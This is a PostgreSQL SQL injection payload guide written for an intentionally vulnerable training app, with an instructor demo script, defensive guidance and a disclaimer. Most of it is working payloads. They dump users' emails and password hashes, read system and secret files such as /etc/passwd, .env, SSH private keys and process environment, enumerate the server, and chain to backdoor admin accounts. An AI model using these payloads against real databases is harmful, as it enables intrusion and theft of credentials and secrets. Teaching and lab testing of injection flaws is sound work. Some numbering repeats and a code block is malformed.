# 🐘 PostgreSQL SQL Injection Payloads Guide

This document contains SQL injection payloads specifically for **PostgreSQL** databases. The Typo Payments application is now running on PostgreSQL, which unlocks advanced exploitation techniques including **file reading**.

---

## 🎯 Quick Reference

**Vulnerable Endpoint**: `/status?id=<payload>`

**Vulnerable Code**:
```python
query = f"SELECT * FROM payments WHERE user_id = {current_user.id} AND id = {payment_id}"
```

**Why it's vulnerable**: Direct string interpolation allows injecting arbitrary SQL.

**⚠️ PostgreSQL Type Matching**: UNION queries require matching column types!

**Payments table schema** (7 columns):
1. `id` - INTEGER
2. `user_id` - INTEGER
3. `recipient` - VARCHAR(120)
4. `amount` - DECIMAL(10, 2)
5. `description` - TEXT
6. `status` - VARCHAR(20)
7. `created_at` - TIMESTAMP

**Template for UNION SELECT**:
```sql
UNION SELECT <int>, <int>, '<string>', 0.00, '<text>', '<string>', CURRENT_TIMESTAMP
```

---

## 🔰 Basic PostgreSQL SQL Injection

### 1. Bypass Authentication Check (OR 1=1)
```
?id=1 OR 1=1
```

**What happens**: Returns ALL payments for the current user

**Query becomes**:
```sql
SELECT * FROM payments WHERE user_id = 3 AND id = 1 OR 1=1
```

### 2. Always True with Comment
```
?id=1 OR 1=1--
```

**PostgreSQL Comment Syntax**: `--` requires a space or newline after it

### 3. Test with Sleep (Time-based SQLi)
```
?id=1 AND pg_sleep(5)
```

**Result**: Page will take 5 seconds to load if vulnerable

---

## 💾 Database Enumeration

### 4. Get PostgreSQL Version
```
?id=1 UNION SELECT 1, 2, version(), 0.00, 'Database version', 'info', CURRENT_TIMESTAMP
```

**Result**: Shows PostgreSQL version (e.g., "PostgreSQL 15.5 on x86_64-pc-linux-gnu")

### 5. Get Current Database Name
```
?id=1 UNION SELECT 1, 2, current_database(), 0.00, 'DB name', 'info', CURRENT_TIMESTAMP
```

### 6. Get Current User
```
?id=1 UNION SELECT 1, 2, current_user, 0.00, 'DB user', 'info', CURRENT_TIMESTAMP
```

### 7. List All Tables (information_schema)
```
?id=1 UNION SELECT 1, 2, table_name, 0.00, table_schema, 'table', CURRENT_TIMESTAMP FROM information_schema.tables WHERE table_schema='public'
```

**Result**: Lists all tables (users, payments, feedback)

### 8. List All Columns in Users Table
```
?id=1 UNION SELECT 1, 2, column_name, 0.00, data_type, is_nullable, CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='users'
```

**Result**: Shows all column names and types:
- id (integer)
- username (character varying)
- email (character varying)
- password_hash (character varying)
- full_name (character varying)
- is_admin (boolean)
- created_at (timestamp)

---

## 🔓 Extract User Credentials

### 9. Extract All Users
```
?id=1 UNION SELECT id, id, username, 0.00, CONCAT(email, ' | ', password_hash), is_admin::text, created_at FROM users
```

**Note**: We map user columns to payment columns:
- id → id (int)
- id → user_id (int) 
- username → recipient (varchar)
- 0.00 → amount (decimal)
- Combined data → description (text)
- is_admin → status (varchar)
- created_at → created_at (timestamp)

### 10. Extract Only Admin Users
```
?id=1 UNION SELECT id, id, username, 0.00, CONCAT('Email: ', email, ' | Hash: ', password_hash), 'ADMIN', created_at FROM users WHERE is_admin=TRUE
```

### 11. Extract Specific User
```
?id=1 UNION SELECT id, id, username, 0.00, password_hash, is_admin::text, created_at FROM users WHERE username='admin'
```

### 12. Count Total Users
```
?id=1 UNION SELECT 1, 2, 'Total users:', COUNT(*)::decimal, 'count result', 'info', CURRENT_TIMESTAMP FROM users
```

---

## 📂 File Reading Attacks (PostgreSQL-Specific)

**⚠️ This is the big difference from SQLite!** PostgreSQL can read files from the filesystem.

### 13. Read /etc/passwd
```
?id=1 UNION SELECT 1, 2, '/etc/passwd', 0.00, pg_read_file('/etc/passwd'), 'file', CURRENT_TIMESTAMP
```

**What you get**: Linux user accounts

### 14. Read /etc/hosts
```
?id=1 UNION SELECT 1, 2, '/etc/hosts', 0.00, pg_read_file('/etc/hosts'), 'file', CURRENT_TIMESTAMP
```

### 15. Read Application .env File
```
?id=1 UNION SELECT 1, 2, '.env file', 0.00, pg_read_file('/app/.env'), 'secrets', CURRENT_TIMESTAMP
```

**What you might find**: API keys, database passwords, secrets

### 15a. Read Database Config File (⭐ HIGH VALUE TARGET)
```
?id=1 UNION SELECT 1, 2, 'dbconf.ini', 0.00, pg_read_file('/tmp/dbconf.ini'), 'credentials', CURRENT_TIMESTAMP
```

**What you get**: 
- Database credentials (production + backup)
- API keys (Stripe, SendGrid, AWS)
- Redis passwords
- JWT secrets
- Webhook tokens
- Monitoring service keys

**Business Impact**: Complete system compromise!

### 16. Read Requirements.txt
```
?id=1 UNION SELECT 1, 2, 'requirements.txt', 0.00, pg_read_file('/app/requirements.txt'), 'deps', CURRENT_TIMESTAMP
```

**Use case**: Map application dependencies

### 17. Read Init Script
```
?id=1 UNION SELECT 1, 2, 'init_db.sql', 0.00, pg_read_file('/docker-entrypoint-initdb.d/init_db.sql'), 'schema', CURRENT_TIMESTAMP
```
?id=1 UNION SELECT 1, 2, 3, pg_read_file('/docker-entrypoint-initdb.d/init_db.sql'), 5, 6, 7
```

### 18. Read SSH Private Keys
```
?id=1 UNION SELECT 1, 2, 'id_rsa', 0.00, pg_read_file('/root/.ssh/id_rsa'), 'ssh-key', CURRENT_TIMESTAMP
```

**Note**: Requires appropriate file permissions

### 19. Read PostgreSQL Config
```
?id=1 UNION SELECT 1, 2, 'postgresql.conf', 0.00, pg_read_file('/var/lib/postgresql/data/postgresql.conf'), 'config', CURRENT_TIMESTAMP
```

---

## 💻 File System Enumeration

### 20. List Application Directory Contents
```
?id=1 UNION SELECT 1, 2, pg_ls_dir('/app'), 0.00, 'File in application directory', 'dir', CURRENT_TIMESTAMP
```

**Result**: Shows all files in /app (app.py, templates/, static/, init_db.py, etc.)

### 21. List /etc Directory
```
?id=1 UNION SELECT 1, 2, pg_ls_dir('/etc'), 0.00, 'System config file', 'dir', CURRENT_TIMESTAMP
```

**Use case**: Find configuration files to read

### 22. List PostgreSQL Data Directory
```
?id=1 UNION SELECT 1, 2, pg_ls_dir('/var/lib/postgresql/data'), 0.00, 'Database file', 'postgres', CURRENT_TIMESTAMP
```

### 23. List Root Directory
```
?id=1 UNION SELECT 1, 2, pg_ls_dir('/'), 0.00, 'Root filesystem entry', 'dir', CURRENT_TIMESTAMP
```

**Result**: Shows top-level directories (bin, etc, usr, var, app, etc.)

### 24. List Template Files
```
?id=1 UNION SELECT 1, 2, pg_ls_dir('/app/templates'), 0.00, 'HTML template', 'dir', CURRENT_TIMESTAMP
```

**Use case**: Find all template files to analyze for XSS vulnerabilities

### 25. Check File Existence
```
?id=1 UNION SELECT 1, 2, 'File check', 0.00, CASE WHEN pg_read_file('/app/.env') IS NOT NULL THEN 'FILE EXISTS' ELSE 'NOT FOUND' END, 'check', CURRENT_TIMESTAMP
```

**Result**: Shows whether a specific file exists and is readable

### 26. Get File Size
```
?id=1 UNION SELECT 1, 2, 'app.py size', length(pg_read_file('/app/app.py'))::decimal, 'File size in bytes', 'info', CURRENT_TIMESTAMP
```

---

## � Database Credentials & Configuration Extraction

### 27. Get Database Connection Info
```
?id=1 UNION SELECT 1, 2, current_database(), 0.00, CONCAT('User: ', current_user, ' | Version: ', version()), 'db_info', CURRENT_TIMESTAMP
```

**Returns**:
- Database name: `typo_payments`
- Current user: `typo_admin`
- PostgreSQL version

### 28. Extract Configuration File Paths
```
?id=1 UNION SELECT 1, 2, name, 0.00, setting, 'config', CURRENT_TIMESTAMP FROM pg_settings WHERE name IN ('config_file', 'hba_file', 'data_directory')
```

**Returns**:
- Config file: `/var/lib/postgresql/data/postgresql.conf`
- Auth config: `/var/lib/postgresql/data/pg_hba.conf`
- Data directory: `/var/lib/postgresql/data`

### 29. List All Database Users
```
?id=1 UNION SELECT 1, 2, usename, 0.00, CONCAT('superuser: ', usesuper::text, ' | createdb: ', usecreatedb::text), 'users', CURRENT_TIMESTAMP FROM pg_user
```

**Returns**: All PostgreSQL users with their privileges

### 30. List All Databases
```
?id=1 UNION SELECT 1, 2, datname, 0.00, CONCAT('owner: ', (SELECT usename FROM pg_user WHERE usesysid = datdba), ' | encoding: ', pg_encoding_to_char(encoding)), 'databases', CURRENT_TIMESTAMP FROM pg_database
```

**Returns**: All databases on the PostgreSQL server

### 31. Active Database Connections
```
?id=1 UNION SELECT 1, 2, datname, 0.00, CONCAT('user: ', usename, ' | client: ', COALESCE(client_addr::text, 'local'), ' | state: ', state), 'connections', CURRENT_TIMESTAMP FROM pg_stat_activity WHERE pid != pg_backend_pid() LIMIT 1
```

**Returns**: Who else is connected to the database

### 32. Extract Password Hashes from Users Table
```
?id=1 UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users
```

**Returns**: All user password hashes (can be cracked with hashcat!)

### 33. Database Fingerprint (One-Shot)
```
?id=1 UNION SELECT 1, 2, 'FINGERPRINT', 0.00, CONCAT('DB: ', current_database(), ' | User: ', current_user, ' | Ver: ', substring(version() from 1 for 20), ' | Dir: ', (SELECT setting FROM pg_settings WHERE name='data_directory')), 'info', CURRENT_TIMESTAMP
```

**Returns**: Complete database fingerprint in one query

### 34. List All Tables in Database
```
?id=1 UNION SELECT 1, 2, tablename, 0.00, CONCAT('schema: ', schemaname, ' | owner: ', tableowner), 'tables', CURRENT_TIMESTAMP FROM pg_tables WHERE schemaname = 'public'
```

**Returns**: All tables (users, payments, feedback, etc.)

### 35. List Columns for Specific Table
```
?id=1 UNION SELECT 1, 2, column_name, 0.00, CONCAT('type: ', data_type, ' | nullable: ', is_nullable), table_name, CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='users'
```

**Returns**: All columns in the 'users' table with their types

### 36. Get Database Size
```
?id=1 UNION SELECT 1, 2, 'db_size', 0.00, pg_size_pretty(pg_database_size(current_database())), 'metrics', CURRENT_TIMESTAMP
```

**Returns**: Total database size (e.g., "245 kB")

### 37. Server Network Information
```
?id=1 UNION SELECT 1, 2, 'network', 0.00, CONCAT('server_addr: ', inet_server_addr()::text, ' | server_port: ', inet_server_port()::text), 'network', CURRENT_TIMESTAMP
```

**Returns**: PostgreSQL server IP and port

---

## �🗂️ Advanced Attacks

### 38. Extract All Feedback (Including Stored XSS)
```
?id=1 UNION SELECT id, username, message, message, 5, 6, created_at::text FROM feedback
```

### 24. Find Highest Value Payments
```
?id=1 UNION SELECT id, recipient, description, amount::text, status, user_id::text, created_at::text FROM payments ORDER BY amount DESC LIMIT 5
```

### 25. Extract Payment Summary
```
?id=1 UNION SELECT user_id, 'Total', 'Amount', SUM(amount)::text, 5, 6, 7 FROM payments GROUP BY user_id
```

### 26. Identify Admin User IDs
```
?id=1 UNION SELECT id, username, email, 'ADMIN FOUND', full_name, '999', created_at::text FROM users WHERE is_admin=TRUE
```

---

## 🎭 Multi-Stage Attack Chains

### Chain 1: File Reading → Credential Extraction → Privilege Escalation

**Step 1**: Read environment variables
```
?id=1 UNION SELECT 1, 2, 3, pg_read_file('/proc/self/environ'), 5, 6, 7
```

**Step 2**: Extract admin credentials from database
```
?id=1 UNION SELECT id, username, email, password_hash, full_name, is_admin::text, created_at::text FROM users WHERE is_admin=TRUE
```

**Step 3**: Login as admin

**Step 4**: Create backdoor accounts via admin panel

---

### Chain 2: SQLi → Read Application Code → Find More Vulnerabilities

**Step 1**: Read main application file
```
?id=1 UNION SELECT 1, 2, 3, pg_read_file('/app/app.py'), 5, 6, 7
```

**Step 2**: Analyze code for additional vulnerabilities

**Step 3**: Exploit XSS vulnerabilities found in code

**Step 4**: Chain XSS for session hijacking

---

### Chain 3: Database Enumeration → Complete Data Exfiltration

**Step 1**: List all tables
```
?id=1 UNION SELECT 1, table_name, 3, 4, 5, 6, 7 FROM information_schema.tables WHERE table_schema='public'
```

**Step 2**: Extract users
```
?id=1 UNION SELECT id, username, email, password_hash, full_name, is_admin::text, created_at::text FROM users
```

**Step 3**: Extract payments
```
?id=1 OR 1=1
```

**Step 4**: Extract feedback
```
?id=1 UNION SELECT id, username, message, message, 5, 6, created_at::text FROM feedback
```

---

## 🔥 Dangerous Advanced Techniques

### 27. Write File (if permissions allow)
```
?id=1; COPY (SELECT 'backdoor content') TO '/tmp/backdoor.txt'
```

**Warning**: Usually requires specific privileges

### 28. Execute System Commands (requires extensions)
```
?id=1; CREATE EXTENSION IF NOT EXISTS plpythonu
```

**Note**: Disabled in most secure configurations

### 29. Large Object Import (Alternative File Read)
```
?id=1; SELECT lo_import('/etc/passwd', 12345)
?id=1 UNION SELECT 1, 2, 3, encode(data, 'escape'), 5, 6, 7 FROM pg_largeobject WHERE loid=12345
```

---

## 🛡️ Defense Techniques

### ❌ VULNERABLE (Current Code)
```python
# PostgreSQL with string formatting - DANGEROUS!
query = f"SELECT * FROM payments WHERE user_id = {current_user.id} AND id = {payment_id}"
cursor.execute(query)
```

### ✅ SECURE (Parameterized Query)
```python
# Using parameterized queries with %s placeholders
query = "SELECT * FROM payments WHERE user_id = %s AND id = %s"
cursor.execute(query, (current_user.id, payment_id))
```

### Additional Security Measures
1. **Input Validation**: Ensure `payment_id` is an integer
2. **Parameterized Queries**: Use `%s` placeholders (NEVER `?` like SQLite)
3. **Least Privilege**: Database user should not have SUPERUSER role
4. **File Access Controls**: Disable `pg_read_file` for app user
5. **Error Suppression**: Don't expose SQL errors in production
6. **WAF**: Deploy Web Application Firewall
7. **Logging**: Monitor for suspicious UNION queries
8. **Security Context**: Run PostgreSQL with restricted permissions

---

## 📝 Demo Script for Instructors

### Setup (1 min)
1. Open application: `http://localhost:5000`
2. Login as Alice: `alice` / `password123`
3. Navigate to Status page

### Demo 1: Basic SQLi (2 min)
```
Legitimate use:
?id=1

SQLi bypass:
?id=1 OR 1=1

Explain: Shows all payments, bypassing user_id check
```

### Demo 2: PostgreSQL-Specific Info (2 min)
```
Show database version:
?id=1 UNION SELECT 1, version(), 3, 4, 5, 6, 7

Explain: PostgreSQL version reveals attack surface
```

### Demo 3: File Reading (3 min) ⭐ **KEY DEMO**
```
Read /etc/passwd:
?id=1 UNION SELECT 1, 2, 3, pg_read_file('/etc/passwd'), 5, 6, 7

Explain:
- This is unique to PostgreSQL (not possible in SQLite)
- Shows system users
- Could read SSH keys, config files, source code
- Demonstrates why DB choice matters for security
```

### Demo 4: Credential Extraction (3 min)
```
Extract admin credentials:
?id=1 UNION SELECT id, username, email, password_hash, full_name, is_admin::text, created_at::text FROM users WHERE is_admin=TRUE

Point out:
- Admin username visible
- Password hash exposed
- Boolean cast to text (::text)
```

### Demo 5: Attack Chain (5 min)
```
1. Use SQLi to read /app/.env file
2. Extract admin credentials from DB
3. Login as admin
4. Create backdoor account
5. Demonstrate privilege escalation complete
```

---

## 🎓 Learning Objectives

After this demo, students should understand:
1. PostgreSQL-specific SQL injection techniques
2. Difference between SQLite and PostgreSQL exploitation
3. How to use `information_schema` for enumeration
4. File reading capabilities in PostgreSQL
5. Why database permissions matter
6. How to chain vulnerabilities for maximum impact
7. Importance of parameterized queries

---

## 🔍 PostgreSQL vs SQLite Differences

| Feature | SQLite | PostgreSQL |
|---------|---------|------------|
| Placeholder | `?` | `%s` |
| Comment | `--` (flexible) | `--` (needs space) |
| File Reading | ❌ No | ✅ `pg_read_file()` |
| Schema View | `sqlite_master` | `information_schema` |
| Type Casting | Limited | `::text`, `::int`, etc. |
| Boolean Type | INTEGER (0/1) | BOOLEAN (TRUE/FALSE) |
| Extensions | None | Many (plpythonu, etc.) |
| System Functions | Limited | `version()`, `current_user`, etc. |

---

## ⚠️ Disclaimer

These payloads are for **educational purposes only** in a controlled demonstration environment. 

**Never** use these techniques against:
- Production systems
- Systems you don't own
- Systems without explicit written permission

Unauthorized access is **illegal** under:
- Computer Fraud and Abuse Act (CFAA)
- GDPR Article 32
- Similar laws worldwide

Maximum penalties include prison time and heavy fines.

---

## 📚 Additional Resources

- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [PostgreSQL Security Documentation](https://www.postgresql.org/docs/current/security.html)
- [SQLMap Automated Testing](https://sqlmap.org/)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [HackTricks PostgreSQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection)

---

## 🆚 Comparison Table: Key Payloads

| Attack Type | SQLite | PostgreSQL |
|------------|---------|------------|
| Version | `SELECT sqlite_version()` | `SELECT version()` |
| Tables | `SELECT name FROM sqlite_master` | `SELECT table_name FROM information_schema.tables` |
| Columns | `SELECT sql FROM sqlite_master` | `SELECT column_name FROM information_schema.columns` |
| Read File | ❌ Not possible | ✅ `SELECT pg_read_file('/path')` |
| Boolean True | `1=1` or `TRUE` | `1=1` or `TRUE` |
| Cast Type | N/A | `column_name::text` |
| Comment | `--` | `--` (space after) or `/**/` |

---

**Last Updated**: November 2025  
**Database Version**: PostgreSQL 15  
**Application**: Typo Payments Demo v2.0
